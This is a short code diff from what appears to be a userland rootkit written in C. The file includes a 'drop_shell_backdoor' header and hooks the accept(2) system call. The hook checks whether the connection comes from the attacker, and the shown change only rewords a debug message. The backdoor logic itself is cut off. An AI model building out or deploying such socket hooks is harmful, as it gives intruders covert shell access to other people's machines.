@@ -23,8 +23,7 @@
 #include "drop_shell_backdoor.h"
 
 int         accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen) {
-    DEBUG(D_INFO, "call accept(2) hooked");
-
+    DEBUG(D_INFO, "called accept(2) hooked");
     int     sock;
 
     if (is_attacker())
